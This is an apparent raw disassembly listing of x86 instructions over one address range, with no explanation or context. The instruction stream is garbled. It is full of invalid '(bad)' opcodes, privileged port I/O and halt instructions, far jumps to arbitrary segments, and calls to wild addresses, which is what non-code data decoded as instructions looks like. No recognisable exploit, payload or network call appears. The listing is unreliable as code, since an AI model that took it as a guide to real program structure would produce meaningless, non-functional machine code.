  4202f8:	cli    
  4202f9:	loope  0x4202dd
  4202fb:	out    0xdc,al
  4202fd:	std    
  4202fe:	add    ebp,ebp
  420300:	loope  0x4202fd
  420302:	add    esp,edi
  420304:	mov    bl,0xdc
  420306:	vpsrlq xmm6,xmm5,xmm4
  42030a:	xlat   BYTE PTR ds:[ebx]
  42030b:	cli    
  42030c:	into   
  42030d:	repz jmp 0xdf15dae3
  420313:	(bad)  
  420314:	clc    
  420315:	pop    es
  420316:	out    dx,eax
  420317:	rcr    edi,0xf0
  42031a:	(bad)  
  42031c:	fmul   DWORD PTR [ecx]
  42031e:	xlat   BYTE PTR ds:[ebx]
  42031f:	clc    
  420320:	loopne 0x4202fe
  420322:	out    dx,al
  420323:	add    dl,cl
  420325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420326:	rcl    ecx,0xc0
  420329:	cmc    
  42032a:	in     al,0xee
  42032c:	int    0xeb
  42032e:	cli    
  42032f:	mov    dh,0xdc
  420331:	xlat   BYTE PTR ds:[ebx]
  420332:	cli    
  420333:	int    0xce
  420335:	ret    0xfce0
  420338:	rol    DWORD PTR [esi],0xfa
  42033b:	(bad)  
  42033d:	fcom   st(5)
  42033f:	clc    
  420340:	cmc    
  420341:	fadd   DWORD PTR ds:0xc7e3cd13
  420347:	jmp    0xe50aea41
  42034c:	mov    ecx,0xeed4e9f0
  420351:	fmulp  st(5),st
  420353:	iret   
  420354:	aam    0xfd
  420356:	aam    0xf7
  420358:	xlat   BYTE PTR ds:[ebx]
  420359:	add    eax,ebx
  42035b:	add    eax,0x2d709e0
  420360:	hlt    
  420361:	std    
  420362:	jmp    0xd7e2:0xaeccce00
  420369:	stos   BYTE PTR es:[edi],al
  42036a:	loopne 0x420336
  42036c:	loopne 0x420361
  42036e:	into   
  42036f:	stc    
  420370:	fstp   TBYTE PTR [ecx-0x3201311]
  420376:	icebp  
  420377:	sti    
  420378:	sti    
  420379:	out    0xc6,al
  42037b:	les    ecx,FWORD PTR [edx]
  42037d:	dec    BYTE PTR [ecx]
  42037f:	leave  
  420380:	pop    es
  420381:	fcomi  st,st(3)
  420383:	int3   
  420384:	mov    edi,0xf0f5c7ac
  420389:	out    dx,al
  42038a:	lods   eax,DWORD PTR ds:[esi]
  42038b:	repz out dx,al
  42038d:	clc    
  42038e:	cli    
  42038f:	fsub   st,st(4)
  420391:	neg    ecx
  420393:	mov    eax,0x1bff8d0
  420398:	idiv   ah
  42039a:	rcl    esi,cl
  42039c:	add    eax,0xede703fe
  4203a1:	or     BYTE PTR [eax],cl
  4203a3:	in     al,dx
  4203a4:	jmp    0xe309ed9b
  4203a9:	shl    DWORD PTR [ebp-0x4a151020],cl
  4203af:	mov    ebx,0xecd7c4ec
  4203b4:	fld1   
  4203b6:	jecxz  0x4203a9
  4203b8:	(bad)  
  4203b9:	in     eax,0xf8
  4203bb:	rol    eax,1
  4203bd:	add    al,0x1
  4203bf:	add    al,0xe2
  4203c1:	movhlps xmm0,xmm0
  4203c4:	in     al,0xf0
  4203c6:	out    0xf3,eax
  4203c8:	out    dx,eax
  4203c9:	out    0xe1,eax
  4203cb:	(bad)  
  4203cc:	fcmovb st,st(4)
  4203ce:	mov    cl,0xf3
  4203d0:	xlat   BYTE PTR ds:[ebx]
  4203d1:	repz rcr esi,cl
  4203d4:	add    ebx,edx
  4203d6:	cli    
  4203d7:	loop   0x420399
  4203d9:	(bad)  
  4203dc:	jmp    0xd01ce8c4
  4203e1:	call   0xb1ecdff3
  4203e6:	enter  0xd1ee,0xb1
  4203ea:	(bad)  
  4203eb:	sti    
  4203ec:	call   0xe02fdde3
  4203f1:	enter  0xcaef,0xf3
  4203f5:	div    cl
  4203f7:	shr    ah,1
  4203f9:	fsubr  st(1),st
  4203fb:	aad    0xdf
  4203fd:	aad    0xca
  4203ff:	jmp    edi
  420401:	std    
  420402:	add    al,0xd3
  420404:	(bad)  
  420405:	icebp  
  420406:	mov    cl,0xe3
  420408:	loop   0x4203b4
  42040a:	aad    0xee
  42040c:	enter  0xfff9,0xbe
  420410:	int3   
  420411:	(bad)  
  420413:	int    0xe9
  420415:	not    esp
  420417:	fcomip st,st(3)
  420419:	loope  0x420426
  42041b:	add    esp,edx
  42041d:	add    al,0xda
  42041f:	std    
  420420:	fild   WORD PTR [ebx]
  420422:	add    al,0xea
  420424:	jmp    0xe937cb18
  420429:	shl    BYTE PTR [ecx-0x490a1b49],0xd5
  420430:	(bad)  
  420431:	cld    
  420432:	jmp    0x1e0:0xd4bff6dc
  420439:	ret    0xdac1
  42043c:	jmp    0x14def08
  420441:	aam    0x12
  420443:	fisubr DWORD PTR [esi-0x332a2338]
  420449:	jmp    0xb7f8fc1e
  42044e:	lock jmp 0x42041d
  420451:	out    dx,al
  420452:	add    cl,ah
  420454:	std    
  420455:	(bad)  
  420456:	std    
  420457:	ffreep st(1)
  420459:	std    
  42045a:	ret    
  42045b:	aam    0xd0
  42045d:	aad    0xe5
  42045f:	prefetch BYTE PTR [ebx]
  420462:	pop    es
  420463:	fsubrp st(4),st
  420465:	mov    dl,0xf2
  420467:	leave  
  420468:	cmc    
  420469:	out    dx,al
  42046a:	fcmovbe st,st(2)
  42046c:	mov    ch,0xd6
  42046e:	fcmovnu st,st(6)
  420470:	retf   
  420471:	jmp    0xd512be65
  420476:	mov    eax,0xe5d2e405
  42047b:	stc    
  42047c:	add    dl,bh
  42047e:	neg    eax
  420480:	push   cs
  420481:	(bad)
  420484:	rol    cl,1
  420486:	mov    esi,0xbbe4d2ce
  42048b:	aad    0xbb
  42048d:	in     eax,0xd9
  42048f:	fmulp  st(6),st
  420491:	out    dx,al
  420492:	repz mov edx,0xf4dbd3ec
  420498:	fdivr  st(5),st
  42049a:	mov    ecx,0xfd00fbe2
  42049f:	fiadd  WORD PTR [esi]
  4204a1:	into   
  4204a2:	leave  
  4204a3:	fidivr DWORD PTR [ecx-0xd423852]
  4204a9:	(bad)  
  4204aa:	iret   
  4204ab:	shl    dl,cl
  4204ad:	mov    edx,0xbfe8fdb4
  4204b2:	retf   
  4204b3:	(bad)  
  4204b5:	loopne 0x4204a3
  4204b7:	add    eax,esp
  4204b9:	ret    0xf503
  4204bc:	div    bh
  4204be:	iret   
  4204bf:	cmc    
  4204c0:	hlt    
  4204c1:	out    dx,al
  4204c2:	in     al,dx
  4204c3:	(bad)  
  4204c5:	iret   
  4204c6:	jecxz  0x420497
  4204c8:	mov    bl,0xc7
  4204ca:	cli    
  4204cb:	lods   al,BYTE PTR ds:[esi]
  4204cc:	in     eax,0xdb
  4204ce:	ror    esi,1
  4204d0:	mov    bl,0xbf
  4204d2:	std    
  4204d3:	fbstp  TBYTE PTR [edi-0xe11fd08]
  4204d9:	ret    
  4204da:	jmp    0x4204e5
  4204dc:	(bad)  
  4204dd:	or     ah,bl
  4204df:	out    0xe5,eax
  4204e1:	int    0xdb
  4204e3:	(bad)  
  4204e5:	enter  0xc0ef,0xdd
  4204e9:	jecxz  0x4204cb
  4204eb:	mov    dh,0xb2
  4204ed:	in     eax,dx
  4204ee:	mov    ah,0xcc
  4204f0:	fcmovnbe st,st(1)
  4204f2:	push   ebx
  4204f4:	mov    esp,0xe5bdfdcd
  4204f9:	lds    eax,FWORD PTR [edi+eiz*8]
  4204fc:	loopne 0x4204da
  4204fe:	enter  0x4d8,0xe2
  420502:	or     dh,bl
  420504:	mov    ebp,0xb0ecddb1
  420509:	lock in al,dx
  42050b:	fcmovbe st,st(0)
  42050d:	(bad)  
  42050f:	clc    
  420510:	fucomp st(0)
  420512:	fstp   TBYTE PTR [ebx-0x471e1400]
  420518:	(bad)  
  42051a:	ret    0xf0c6
  42051d:	add    al,0xe8
  42051f:	loopne 0x4204f9
  420521:	(bad)
  420524:	out    dx,al
  420525:	loopne 0x4204cc
  420527:	aad    0xd7
  420529:	out    dx,eax
  42052a:	mov    al,0xcb
  42052c:	shr    esp,1
  42052e:	test   ah,0xbf
  420531:	fcompp 
  420533:	mov    esi,0xd7b5d5bb
  420538:	jecxz  0x42051d
  42053a:	mov    esp,0xfe060bda
  42053f:	hlt    
  420540:	or     ebx,esp
  420542:	std    
  420543:	enter  0xd8ce,0xcd
  420547:	rcl    al,0xc2
  42054a:	jecxz  0x42050e
  42054c:	stc    
  42054d:	in     al,0xc7
  42054f:	fxch   st(2)
  420551:	icebp  
  420552:	fiadd  WORD PTR [edx]
  420554:	call   0xc417e116
  420559:	mov    esi,0xd6e0c2d6
  42055e:	add    cl,bh
  420560:	(bad)  
  420562:	enter  0xe803,0xc3
  420566:	(bad)  
  420567:	icebp  
  420568:	(bad)  
  420569:	jmp    0xf5d1:0xcec9cbe8
  420570:	call   0xc016d139
  420575:	cmc    
  420576:	shr    ah,0xfd
  420579:	out    0x3,al
  42057b:	add    ebp,ebx
  42057d:	fdivrp st(4),st
  42057f:	fisttp DWORD PTR [edi]
  420581:	push   es
  420582:	or     ebx,edx
  420584:	out    0xc0,al
  420586:	into   
  420587:	jmp    0xb6cd:0xfbd6c3d1
  42058e:	mov    edi,0xf2efdbee
  420593:	jecxz  0x420567
  420595:	fadd   DWORD PTR [eax]
  420597:	fdivr  DWORD PTR [ecx+esi*8-0x1a2a2823]
  42059e:	push   es
  42059f:	or     eax,0xd9c8fec7
  4205a4:	jmp    0xb1f5:0xc9c9eac6
  4205ab:	repnz mov cl,0xd9
  4205ae:	sar    DWORD PTR [ecx-0x6420448],cl
  4205b4:	sar    ebp,0xd8
  4205b7:	mov    esp,0xf4e1c7cd
  4205bc:	fsubr  st(1),st
  4205be:	rol    eax,0xfe
  4205c1:	(bad)  
  4205c2:	out    dx,eax
  4205c3:	loopne 0x42056d
  4205c5:	ret    
  4205c6:	int    0xaf
  4205c8:	mov    esp,0xceb4b1cb
  4205cd:	call   0xcf35f488
  4205d2:	mov    esi,0xf4bcd2ea
  4205d7:	hlt    
  4205d8:	ffreep st(5)
  4205da:	jecxz  0x42059f
  4205dc:	(bad)
  4205df:	(bad)  
  4205e1:	fsubp  st(6),st
  4205e3:	add    eax,0xc9e4d3be
  4205e8:	enter  0xf6ec,0xd7
  4205ec:	shl    ch,1
  4205ee:	(bad)  
  4205f0:	mov    edi,0xd9b403f8
  4205f5:	out    dx,al
  4205f6:	loope  0x4205e5
  4205f8:	add    al,bh
  4205fa:	(bad)  
  4205fb:	clc    
  4205fc:	or     ecx,DWORD PTR [ebx]
  4205fe:	in     al,0xe
  420600:	stc    
  420601:	retf   0xe209
  420604:	jecxz  0x4205c2
  420606:	fadd   st(7),st
  420608:	jmp    0xaff2f4c4
  42060d:	retf   
  42060e:	stc    
  42060f:	fsincos 
  420611:	out    dx,eax
  420612:	repz cld 
  420614:	rol    bl,cl
  420616:	repnz cli 
  420618:	pop    es
  420619:	icebp  
  42061a:	hlt    
  42061b:	in     al,0xf6
  42061d:	test   cl,0xce
  420620:	fcmovne st,st(1)
  420622:	fsub   st(7),st
  420624:	les    ebp,FWORD PTR [ebp-0xd284249]
  42062a:	iret   
  42062b:	out    dx,eax
  42062c:	lock (bad) 
  42062f:	std    
  420630:	into   
  420631:	in     al,0xf5
  420633:	fadd   DWORD PTR [ecx]
  420635:	mov    edi,0xd4bfc0c7
  42063a:	(bad)  
  42063b:	(bad)  
  42063d:	(bad)  
  42063e:	pmullw mm1,mm1
  420641:	into   
  420642:	retf   
  420643:	(bad)  
  420644:	out    0xce,eax
  420646:	xlat   BYTE PTR ds:[ebx]
  420647:	rol    al,cl
  420649:	jecxz  0x42060f
  42064b:	enter  0xcdc8,0xea
  42064f:	cli    
  420650:	retf   
  420651:	icebp  
  420652:	repnz hlt 
  420654:	iret   
  420655:	into   
  420656:	fadd   QWORD PTR [esi]
  420658:	out    0xec,al
  42065a:	(bad)  
  42065c:	jmp    esp
  42065e:	jmp    0x420645
  420660:	fcmovb st,st(4)
  420662:	add    eax,0xcdb8aece
  420667:	enter  0xeacf,0xa9
  42066b:	loope  0x420668
  42066d:	hlt    
  42066e:	out    dx,al
  42066f:	enter  0xdced,0xda
  420673:	mov    edx,0xf7d6c1c1
  420678:	add    edx,edx
  42067a:	(bad)  
  42067b:	(bad)  
  42067c:	jmp    0x543c390
  420681:	prefetchwt1 BYTE PTR [ebx]
  420684:	(bad)
  420688:	mov    cl,0xc3
  42068a:	jmp    0xf6d6:0xdbf0f5f9
  420691:	jmp    0x42065e
  420693:	out    dx,al
  420694:	rcl    ebp,0xfe
  420697:	loopne 0x42068f
  420699:	loop   0x420678
  42069b:	stc    
  42069c:	jmp    0x420676
  42069e:	or     al,bh
  4206a0:	jecxz  0x420684
  4206a2:	stc    
  4206a3:	adc    eax,ebx
  4206a5:	jmp    0xf1e6:0xf2d7c1ed
  4206ac:	out    0xf3,eax
  4206ae:	mov    cl,0xb6
  4206b0:	in     eax,0xfe
  4206b2:	(bad)  
  4206b3:	mov    edx,0x7b901f2
  4206b8:	in     al,dx
  4206b9:	cld    
  4206ba:	or     edi,DWORD PTR [eax-0x252afbfb]
  4206c0:	retf   
  4206c1:	leave  
  4206c2:	add    al,0xe0
  4206c4:	retf   
  4206c5:	rol    dh,1
  4206c7:	loopne 0x4206b3
  4206c9:	rcl    ebp,cl
  4206cb:	repnz aam 0xb2
  4206ce:	ror    esi,cl
  4206d0:	in     eax,dx
  4206d1:	xlat   BYTE PTR ds:[ebx]
  4206d2:	fcmovnbe st,st(2)
  4206d4:	add    bl,dh
  4206d6:	mov    ch,0xd8
  4206d8:	add    eax,0xdee0fcfe
  4206dd:	cli    
  4206de:	push   es
  4206df:	hlt    
  4206e0:	std    
  4206e1:	adc    ecx,DWORD PTR [edi]
  4206e3:	clc    
  4206e4:	out    dx,al
  4206e5:	mov    edi,0xb1cbbede
  4206ea:	mov    ah,0xb7
  4206ec:	into   
  4206ed:	call   0xdbfbffcd
  4206f2:	(bad)  
  4206f3:	push   ebp
  4206f5:	out    0xcf,eax
  4206f7:	sar    ah,1
  4206f9:	(bad)  
  4206fb:	cmc    
  4206fc:	fstp   st(1)
  4206fe:	out    0xb,eax
  420700:	into   
  420701:	(bad)  
  420703:	stc    
  420704:	lds    esi,FWORD PTR [eax-0x391c2135]
  42070a:	mov    dh,0xf2
  42070c:	(bad)  
  42070d:	scas   al,BYTE PTR es:[edi]
  42070e:	fdiv   DWORD PTR [edi-0x294a0316]
  420714:	cmc    
  420715:	fmul   st,st(5)
  420717:	out    0xfe,eax
  420719:	(bad)  
  42071a:	jecxz  0x420713
  42071c:	hlt    
  42071d:	or     bh,dl
  42071f:	pop    es
  420720:	std    
  420721:	push   es
  420722:	fadd   st(0),st
  420724:	ret    
  420725:	mov    dl,0xec
  420727:	jmp    0xc5f6e7db
  42072c:	lock ror ebx,1
  42072f:	mov    edx,0xc8fefdd5
  420734:	sti    
  420735:	call   0xc139eb13
  42073a:	push   es
  42073b:	fdiv   st,st(4)
  42073d:	add    ah,al
  42073f:	push   es
  420740:	in     eax,dx
  420741:	leave  
  420742:	in     al,0xfe
  420744:	test   al,0xec
  420746:	rol    al,1
  420748:	retf   
  420749:	lods   eax,DWORD PTR ds:[esi]
  42074a:	in     eax,dx
  42074b:	shl    ecx,0xfa
  42074e:	retf   
  42074f:	lock fcomp st(3)
  420752:	fucomip st,st(5)
  420754:	into   
  420755:	mov    eax,0x5d906
  42075a:	rol    ecx,0xfe
  42075d:	add    ebp,eax
  42075f:	fcomp  st(4)
  420761:	(bad)  
  420762:	clts   
  420764:	mov    ebp,0xc4c5dfc5
  420769:	jecxz  0x42074f
  42076b:	mul    al
  42076d:	call   0xf01dd23b
  420772:	cmc    
  420773:	dec    cl
  420775:	in     al,dx
  420776:	xlat   BYTE PTR ds:[ebx]
  420777:	out    dx,al
  420778:	rcl    edx,cl
  42077a:	ret    
  42077b:	out    0xc3,al
  42077d:	stc    
  42077e:	in     eax,0x3
  420780:	in     eax,dx
  420781:	in     al,dx
  420782:	sti    
  420783:	repnz shl al,0xee
  420787:	xlat   BYTE PTR ds:[ebx]
  420788:	mov    ch,0xbc
  42078a:	loopne 0x420750
  42078c:	out    dx,eax
  42078d:	iret   
  42078e:	in     eax,dx
  42078f:	rcr    ebp,1
  420791:	mov    ebp,0xe7e3edd1
  420796:	(bad)  
  420797:	fcomip st,st(6)
  420799:	mov    edx,0xfdf6e2cb
  42079e:	fdivp  st(2),st
  4207a0:	std    
  4207a1:	fadd   DWORD PTR [edx+ecx*1]
  4207a4:	fsubr  st,st(0)
  4207a6:	iret   
  4207a7:	iret   
  4207a8:	scas   al,BYTE PTR es:[edi]
  4207a9:	into   
  4207aa:	(bad)  
  4207ac:	shl    eax,0xf5
  4207af:	out    dx,eax
  4207b0:	fidivr DWORD PTR [esi-0x30123c28]
  4207b6:	rcr    esp,cl
  4207b8:	rol    edi,1
  4207ba:	mov    esp,0xdbc501fd
  4207bf:	in     eax,dx
  4207c0:	in     al,dx
  4207c1:	std    
  4207c2:	(bad)  
  4207c4:	(bad)  
  4207c6:	out    dx,al
  4207c7:	imul   BYTE PTR [ebp-0x4837252b]
  4207cd:	imul   cl
  4207cf:	leave  
  4207d0:	mov    eax,0xcdd4b9e3
  4207d5:	shl    eax,1
  4207d7:	std    
  4207d8:	add    eax,0x8dcbdbc
  4207dd:	fstp   st(0)
  4207df:	(bad)  [esi+eax*1]
  4207e2:	retf   0xf3c8
  4207e5:	(bad)  
  4207e6:	leave  
  4207e7:	cmc    
  4207e8:	int3   
  4207e9:	int3   
  4207ea:	fcomi  st,st(1)
  4207ec:	imul   dh
  4207ee:	rcl    bl,1
  4207f0:	leave  
  4207f1:	f2xm1  
  4207f3:	(bad)  
  4207f4:	cld    
  4207f5:	cmc    
  4207f6:	add    ecx,ebp
  4207f8:	out    0xc0,eax
  4207fa:	hlt    
  4207fb:	hlt    
  4207fc:	fst    st(7)
  4207fe:	add    DWORD PTR [ebx],eax
  420800:	out    0xe0,eax
  420802:	fadd   QWORD PTR [ebx]
  420804:	(bad)
  420807:	fst    st(0)
  420809:	lock fcomi st,st(1)
  42080c:	aad    0xf9
  42080e:	aam    0xe8
  420810:	out    dx,al
  420811:	in     al,dx
  420812:	sti    
  420813:	loope  0x4207ef
  420815:	stc    
  420816:	add    DWORD PTR [esi],eax
  420818:	xlat   BYTE PTR ds:[ebx]
  420819:	idiv   ebp
  42081b:	jmp    0xf527042a
  420820:	in     al,dx
  420821:	retf   
  420822:	out    0xcd,eax
  420824:	enter  0xaead,0xc0
  420828:	aam    0xc6
  42082a:	in     al,dx
  42082b:	mov    cl,0xd4
  42082d:	rol    ah,0xe4
  420830:	int    0xd0
  420832:	hlt    
  420833:	into   
  420834:	sar    BYTE PTR [ecx-0x1e0c3108],1
  42083a:	shl    esp,1
  42083c:	loope  0x420807
  42083e:	lds    ecx,FWORD PTR ds:0xcd900d5
  420844:	jmp    0xe9e0:0xe4d3c3df
  42084b:	fldpi  
  42084d:	fcomip st,st(1)
  42084f:	out    dx,al
  420850:	out    dx,eax
  420851:	div    ecx
  420853:	(bad)  
  420854:	sar    DWORD PTR [esi-0x390b322f],0xb
  42085b:	or     esp,eax
  42085d:	out    0xea,eax
  42085f:	or     esp,ecx
  420861:	hlt    
  420862:	call   0xb10af051
  420867:	rcl    dl,1
  420869:	out    dx,eax
  42086a:	aam    0xce
  42086c:	(bad)  
  42086d:	call   0xd52bbd1f
  420872:	retf   0xdbf3
  420875:	add    edx,esp
  420877:	(bad)  
  420878:	loope  0x420859
  42087a:	jecxz  0x42085a
  42087c:	fcmovb st,st(1)
  42087e:	(bad)  
  42087f:	jmp    0xdeac:0xc4e3e7c3
  420886:	shl    BYTE PTR [edx-0x515133e],0xaf
  42088d:	mov    eax,0xf3ddd6d3
  420892:	rcr    ch,1
  420894:	stc    
  420895:	lock fcmovnbe st,st(2)
  420898:	xlat   BYTE PTR ds:[ebx]
  420899:	(bad)  
  42089a:	fdiv   st,st(1)
  42089c:	sar    cl,1
  42089e:	fndisi(8087 only) 
  4208a0:	jmp    0xe929ccb3
  4208a5:	fsubp  st(6),st
  4208a7:	mov    bh,0xc7
  4208a9:	out    0xf1,eax
  4208ab:	call   0xfb27e378
  4208b0:	(bad)  
  4208b1:	mov    esi,0xdbeff2f1
  4208b6:	shr    ebp,cl
  4208b8:	fnstcw WORD PTR [edx-0x243bf623]
  4208be:	clc    
  4208bf:	jecxz  0x4208ca
  4208c1:	jmp    0x4208d0
  4208c3:	or     dl,ch
  4208c5:	sar    DWORD PTR [ebp-0x28082a09],cl
  4208cb:	in     eax,0xcb
  4208cd:	fadd   st,st(4)
  4208cf:	mov    edx,0xb8fdb5e8
  4208d4:	mov    bh,0xdb
  4208d6:	fistp  QWORD PTR [ebp+eax*1-0x29082e14]
  4208dd:	rol    BYTE PTR [ebx],0xfc
  4208e0:	or     eax,0xefcaccf3
  4208e5:	test   eax,0xace9d3af
  4208ea:	mov    bh,0xe4
  4208ec:	(bad)  
  4208ed:	sti    
  4208ee:	mov    ah,0xe9
  4208f0:	stc    
  4208f1:	clc    
  4208f2:	retf   
  4208f3:	shl    ebx,cl
  4208f5:	out    0xbc,eax
  4208f7:	mov    ebp,0xe406c3fd
  4208fc:	xlat   BYTE PTR ds:[ebx]
  4208fd:	out    0xee,al
  4208ff:	in     eax,0xc
  420901:	loope  0x4208f5
  420903:	add    al,dh
  420905:	(bad)  
  420906:	jmp    0xd23dbedd
  42090b:	div    dh
  42090d:	in     al,dx
  42090e:	jmp    0x4208f9
  420910:	int    0xbd
  420912:	mov    esi,0xf0bcd7d1
  420917:	out    0xed,al
  420919:	cli    
  42091a:	mov    ah,0x1
  42091d:	cmc    
  42091e:	fild   DWORD PTR ds:0xed13e8ec
  420924:	ret    0xaef3
  420927:	rcl    eax,cl
  420929:	loope  0x420918
  42092b:	retf   
  42092c:	mov    edx,0xb9e9b9ba
  420931:	cld    
  420932:	mov    ecx,0xd403f3d4
  420937:	(bad)  
  420938:	in     eax,0xc6
  42093a:	shl    esp,0x9
  42093d:	jecxz  0x420922
  42093f:	neg    dh
  420941:	add    eax,0xdceac0ef
  420946:	ror    esi,cl
  420948:	loope  0x4208ff
  42094a:	iret   
  42094b:	ror    ebx,0xcb
  42094e:	out    0xe9,al
  420950:	icebp  
  420951:	cmc    
  420952:	enter  0xfcd7,0xee
  420956:	int3   
  420957:	(bad)  
  420958:	mov    esp,0xc2e2d7c7
  42095d:	add    bh,cl
  42095f:	push   es
  420960:	fcomi  st,st(4)
  420962:	call   0xbee8f679
  420967:	icebp  
  420968:	int    0xf7
  42096a:	ror    esp,1
  42096c:	enter  0xebce,0xe5
  420970:	std    
  420971:	neg    esi
  420973:	stc    
  420974:	fnstsw WORD PTR [edx+0x4c1f0e0]
  42097a:	jecxz  0x42097d
  42097c:	add    ecx,DWORD PTR [edx]
  42097e:	in     eax,0xfc
  420980:	or     ebp,esi
  420982:	into   
  420983:	stc    
  420984:	int3   
  420985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420986:	in     al,0xbe
  420988:	(bad)  
  420989:	in     al,dx
  42098a:	rcl    esi,1
  42098c:	int    0xb4
  42098e:	jmp    0xbe11c45f
  420993:	cld    
  420994:	jecxz  0x420962
  420996:	mov    esp,0x4d7d2d5
  42099b:	jmp    0xd72ce1a1
  4209a0:	cld    
  4209a1:	iret   
  4209a2:	pop    es
  4209a3:	add    bl,dl
  4209a5:	iret   
  4209a6:	fucom  st(5)
  4209a8:	mov    dl,0xc0
  4209aa:	repnz div bh
  4209ad:	retf   
  4209ae:	cmc    
  4209af:	out    dx,al
  4209b0:	in     eax,dx
  4209b1:	sar    DWORD PTR [ebx-0x33202a0c],cl
  4209b7:	(bad)  
  4209b8:	mov    esi,0x900d4d7
  4209bd:	aam    0xfe
  4209bf:	call   0xe0fedbd
  4209c4:	lods   eax,DWORD PTR ds:[esi]
  4209c5:	out    dx,al
  4209c6:	lock int 0xc9
  4209c9:	jmp    0xd70dbeb9
  4209ce:	xlat   BYTE PTR ds:[ebx]
  4209cf:	in     eax,dx
  4209d0:	cld    
  4209d1:	mov    esi,0xdbd5bdc9
  4209d6:	rol    DWORD PTR [ecx],1
  4209d8:	(bad)  
  4209d9:	cld    
  4209da:	fdiv   st,st(2)
  4209dc:	icebp  
  4209dd:	lock (bad) 
  4209df:	(bad)  
  4209e0:	iret   
  4209e1:	or     cl,cl
  4209e3:	icebp  
  4209e4:	out    dx,eax
  4209e5:	out    0xa8,eax
  4209e7:	jmp    0xb2f9b7dc
  4209ec:	(bad)  
  4209ee:	mov    edi,0xb5bef6b8
  4209f3:	retf   0xe0ec
  4209f6:	aad    0xbf
  4209f8:	(bad)  
  4209f9:	add    eax,0xd5e3f0da
  4209fe:	aam    0x1
  420a00:	loopne 0x4209cf
  420a02:	or     cl,BYTE PTR [ecx]
  420a04:	shr    edx,1
  420a06:	scas   al,BYTE PTR es:[edi]
  420a07:	out    dx,eax
  420a08:	rol    esp,1
  420a0a:	(bad)  
  420a0c:	lock into 
  420a0e:	neg    esi
  420a10:	fldpi  
  420a12:	repnz loope 0x4209d1
  420a15:	out    0xfb,eax
  420a17:	in     eax,0xe6
  420a19:	shl    ah,cl
  420a1b:	rol    edi,1
  420a1d:	retf   0xeeca
  420a20:	dec    dh
  420a22:	dec    DWORD PTR [eax]
  420a24:	mov    ecx,0xb5c7b7ef
  420a29:	in     al,0xd0
  420a2b:	(bad)  
  420a2c:	in     al,dx
  420a2d:	shl    BYTE PTR [edi-0xc344710],1
  420a33:	std    
  420a34:	stc    
  420a35:	mov    eax,0xbc04e701
  420a3a:	lock (bad) 
  420a3c:	pop    es
  420a3d:	fmul   st,st(3)
  420a3f:	bswap  edi
  420a41:	repz call 0xe808b349
  420a47:	leave  
  420a48:	loop   0x420a1f
  420a4a:	int3   
  420a4b:	jmp    0xe639da2b
  420a50:	out    dx,al
  420a51:	mov    esp,0xf8e9c2d1
  420a56:	mov    ch,0xd4
  420a58:	rol    BYTE PTR [ebx],1
  420a5a:	(bad)  
  420a5b:	(bad)  
  420a5d:	push   es
  420a5e:	loope  0x420a38
  420a60:	or     edx,eax
  420a62:	add    al,0xe9
  420a64:	out    0xe3,eax
  420a66:	test   eax,0xc3d5cfd0
  420a6b:	(bad)  
  420a6c:	rol    edi,cl
  420a6e:	enter  0xb3eb,0xd2
  420a72:	loop   0x420a2d
  420a74:	loopne 0x420a42
  420a76:	fucomi st,st(5)
  420a78:	(bad)  
  420a79:	fld    DWORD PTR [edi+eax*1]
  420a7c:	add    bl,bh
  420a7e:	std    
  420a7f:	fsub   st(7),st
  420a81:	push   cs
  420a82:	add    al,0x9
  420a84:	in     al,dx
  420a85:	fucomip st,st(3)
  420a87:	jmp    0x420a6c
  420a89:	in     eax,0xda
  420a8b:	icebp  
  420a8c:	enter  0xc5b5,0xf4
  420a90:	enter  0xd5fc,0xdf
  420a94:	mov    edi,0xf0d5cef0
  420a99:	mov    esp,0xcbf4f2dc
  420a9e:	(bad)  
  420aa0:	fisttp QWORD PTR ds:0xc9f204dd
  420aa6:	enter  0xeee3,0xed
  420aaa:	jecxz  0x420aa6
  420aac:	div    edi
  420aae:	div    BYTE PTR [esi-0x17040807]
  420ab4:	int3   
  420ab5:	idiv   ebp
  420ab7:	rol    DWORD PTR [edx],1
  420ab9:	(bad)  
  420abb:	hlt    
  420abc:	jmp    0xdae8:0xecff0ffd
  420ac3:	(bad)  
  420ac4:	call   0xe433f58f
  420ac9:	lods   eax,DWORD PTR ds:[esi]
  420aca:	sti    
  420acb:	loopne 0x420aa0
  420acd:	mov    ah,0xd1
  420acf:	mov    ch,0xd4
  420ad1:	not    ch
  420ad3:	add    ebx,esi
  420ad5:	pop    es
  420ad6:	loop   0x420a94
  420ad8:	xabort 0xe2
  420adb:	retf   0xe1f6
  420ade:	add    bh,bh
  420ae0:	add    al,0x6
  420ae2:	adc    esp,ebp
  420ae4:	loopne 0x420aae
  420ae6:	retf   
  420ae7:	retf   
  420ae8:	rcl    esp,cl
  420aea:	int3   
  420aeb:	repz out dx,eax
  420aed:	mov    ecx,0xd7c4ddef
  420af2:	rcr    ebp,cl
  420af4:	out    dx,eax
  420af5:	std    
  420af6:	out    dx,eax
  420af7:	mov    bl,0x0
  420afa:	shl    bh,0xe1
  420afd:	(bad)  
  420aff:	or     edx,esp
  420b01:	out    dx,eax
  420b02:	or     cl,bh
  420b04:	test   al,0xb3
  420b06:	shr    BYTE PTR [eax-0x451a2a0f],1
  420b0c:	in     al,dx
  420b0d:	loopne 0x420ae1
  420b0f:	(bad)  
  420b10:	cmc    
  420b11:	mov    dh,0xd7
  420b13:	out    dx,eax
  420b14:	add    DWORD PTR [esi-0x220af8fe],edi
  420b1a:	in     al,0xd0
  420b1c:	loope  0x420b1b
  420b1e:	sti    
  420b1f:	(bad)  
  420b21:	or     ah,al
  420b23:	(bad)  
  420b24:	shl    edi,cl
  420b26:	ret    0xe9d7
  420b29:	les    esi,FWORD PTR [edi-0x400b332b]
  420b2f:	mov    esi,0xb9d0f9ba
  420b34:	repnz mov eax,0xf2e6bfd4
  420b3a:	(bad)  
  420b3b:	jmp    ecx
  420b3d:	fucomi st,st(1)
  420b3f:	fmul   DWORD PTR [esi+edi*8]
  420b42:	(bad)
  420b45:	jecxz  0x420af3
  420b47:	out    dx,eax
  420b48:	mov    cl,0xd3
  420b4a:	fcmovb st,st(5)
  420b4c:	mov    al,0xf9
  420b4e:	sti    
  420b4f:	lock (bad) 
  420b51:	fld    st(3)
  420b53:	fdivr  st(6),st
  420b55:	mov    esi,0xdeccdff5
  420b5a:	ffreep st(5)
  420b5c:	jmp    0xff3de823
  420b61:	push   cs
  420b62:	fmul   st,st(6)
  420b64:	(bad)  
  420b66:	ror    ch,0xdd
  420b69:	ret    0xc0b6
  420b6c:	in     al,0xda
